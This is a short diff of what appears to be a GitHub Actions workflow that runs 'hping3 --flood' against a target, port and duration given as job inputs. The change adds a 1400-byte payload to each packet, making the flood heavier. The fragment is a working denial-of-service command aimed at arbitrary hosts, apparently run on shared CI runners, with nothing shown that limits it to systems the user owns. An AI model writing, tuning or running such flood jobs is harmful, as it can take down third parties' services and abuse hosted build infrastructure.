@@ -33,5 +33,5 @@ jobs:
             esac
           fi
           echo "flags: $FLAGS"
-          sudo timeout ${{ inputs.seconds }} hping3 --flood $FLAGS $RS -p ${{ inputs.port }} ${{ inputs.target }} 2>&1 | tail -4
+          sudo timeout ${{ inputs.seconds }} hping3 --flood $FLAGS $RS -d 1400 -p ${{ inputs.port }} ${{ inputs.target }} 2>&1 | tail -4
 
